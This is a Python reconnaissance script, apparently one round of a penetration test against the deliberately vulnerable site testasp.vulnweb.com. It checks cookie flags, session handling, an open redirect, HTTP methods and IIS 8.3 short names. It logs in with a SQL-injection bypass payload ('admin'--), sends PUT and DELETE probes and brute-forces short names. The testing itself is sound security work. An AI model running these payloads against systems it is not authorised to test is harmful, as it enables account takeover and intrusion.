#!/usr/bin/env python3
"""Round 9 — 세션/인증 로직·쿠키 속성·HTTP 메서드·IIS 8.3 단축명 정찰 (전부 읽기 전용)."""
import os
import subprocess
import urllib.parse

BASE = "http://testasp.vulnweb.com"
HTTPS = "https://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]
J = "/home/taeuk/projects/llm-abliteration/hermes-harness/journal/web/testphp-vulnweb-test"
SCR = f"{J}/scratch/r9"
EVI = f"{J}/evidence/r9"
os.makedirs(SCR, exist_ok=True)
os.makedirs(EVI, exist_ok=True)


def curl(url, data=None, jar=None, method=None, hdr_file=None, body_file=None,
         timeout=40, extra=None):
    h = hdr_file or f"{SCR}/_h.tmp"
    b = body_file or f"{SCR}/_b.tmp"
    cmd = ["curl", "-s", "-S"] + PROXY + ["-m", str(timeout), "-D", h, "-o", b,
           "-w", "%{http_code} %{time_total}"]
    if jar:
        cmd += ["-b", jar, "-c", jar]
    if data is not None:
        cmd += ["-X", "POST", "--data", data]
    if method:
        cmd += ["-X", method]
    if extra:
        cmd += extra
    cmd.append(url)
    r = subprocess.run(cmd, capture_output=True, text=True)
    rd = lambda p: open(p, "rb").read().decode("latin-1") if os.path.exists(p) else ""
    return (r.stdout or "").strip(), rd(h), rd(b)


def cookies_of(hdrs):
    return [l.strip() for l in hdrs.splitlines() if l.lower().startswith("set-cookie:")]


print("=" * 74)
print("A. Set-Cookie 속성 (HttpOnly / Secure / SameSite)")
print("=" * 74)
for label, url, data in [("첫방문 /Default.asp", f"{BASE}/Default.asp", None),
                         ("로그인 POST", f"{BASE}/Login.asp", "tfUName=admin'--&tfUPass=x")]:
    info, hdr, _ = curl(url, data=data, jar=f"{SCR}/a.cookies")
    print(f"  [{label}] {info}")
    for c in cookies_of(hdr):
        print("    " + c)
    flags = []
    for c in cookies_of(hdr):
        low = c.lower()
        flags.append((("httponly" in low), ("secure" in low), ("samesite" in low)))
    print(f"    → HttpOnly/Secure/SameSite = {flags}")

print()
print("=" * 74)
print("B. 세션 고정/재사용 — 로그인 전후 ASPSESSIONID 동일 여부, 로그아웃 후 재사용")
print("=" * 74)
JAR = f"{SCR}/sess.cookies"
if os.path.exists(JAR):
    os.remove(JAR)
_, h1, _ = curl(f"{BASE}/Default.asp", jar=JAR)
sid_before = [l for l in cookies_of(h1)]
_, h2, _ = curl(f"{BASE}/Login.asp", data="tfUName=admin'--&tfUPass=x", jar=JAR)
_, h3, b3 = curl(f"{BASE}/Default.asp", jar=JAR)
sid_after = [l for l in cookies_of(h3)]
print(f"  로그인 전 Set-Cookie : {sid_before}")
print(f"  로그인 후 Set-Cookie : {sid_after}")
print(f"  로그인 상태 확인     : {'logout admin' in b3}")
_, h4, _ = curl(f"{BASE}/Logout.asp", jar=JAR)
_, _, b5 = curl(f"{BASE}/Default.asp", jar=JAR)
print(f"  Logout.asp 후        : 로그인 흔적={'logout ' in b5}  (login 링크={'?RetURL' in b5})")
# 저장된 세션 쿠키 재사용(로그아웃 후 같은 쿠키로 접근)
_, _, b6 = curl(f"{BASE}/Default.asp", jar=JAR)
print(f"  같은 쿠키 재사용     : 세션 유지 여부={'logout ' in b6}")

print()
print("=" * 74)
print("C. Logout.asp 의 RetURL (open redirect 2차 경로)")
print("=" * 74)
for ret in ("http://example.com/", "//example.com/"):
    info, hdr, _ = curl(f"{BASE}/Logout.asp?RetURL=" + urllib.parse.quote(ret, safe=""))
    loc = [l.strip() for l in hdr.splitlines() if l.lower().startswith("location:")]
    print(f"  RetURL={ret:22} → {info}  {loc}")

print()
print("=" * 74)
print("D. HTTP 메서드 / IIS 8.3 단축명 / 기타")
print("=" * 74)
for m, u in [("OPTIONS", "/Default.asp"), ("TRACE", "/Default.asp"), ("PUT", "/x7.asp"),
             ("DELETE", "/x7.asp")]:
    info, hdr, _ = curl(f"{BASE}{u}", method=m)
    allow = [l.strip() for l in hdr.splitlines() if l.lower().startswith(("allow:", "http/"))]
    print(f"  {m:8} {u:16} → {info}  {allow}")
for u in ["/Default~1.asp", "/Templa~1.asp", "/Templat~1.asp", "/showfo~1.asp", "/web~1.con",
          "/Login~1.asp", "/Search~1.asp", "/db~1.asp", "/Templates/MainTemp~1.dwt.asp"]:
    info, hdr, body = curl(f"{BASE}{u}")
    size = info.split()[1] if len(info.split()) > 1 else "?"
    mark = "  ← 200!" if info.startswith("200") else ""
    print(f"  8.3 {u:32} → {info}{mark}")
    if info.startswith("200"):
        open(f"{EVI}/r9_shortname_{u.replace('/', '_')}", "w").write(body)

print()
print("=" * 74)
print("E. HTTPS 가용성 / 보안 헤더 부재 확인")
print("=" * 74)
info, hdr, _ = curl(f"{HTTPS}/Default.asp")
print(f"  HTTPS /Default.asp → {info}")
info, hdr, _ = curl(f"{BASE}/Default.asp")
hs = [l.split(":", 1)[0].strip().lower() for l in hdr.splitlines() if ":" in l]
for sec in ("content-security-policy", "x-frame-options", "x-content-type-options",
            "strict-transport-security", "referrer-policy", "permissions-policy"):
    print(f"  {sec:32} : {'있음' if sec in hs else '없음'}")
open(f"{EVI}/r9_default_headers.txt", "w").write(hdr)

print()
print("done")
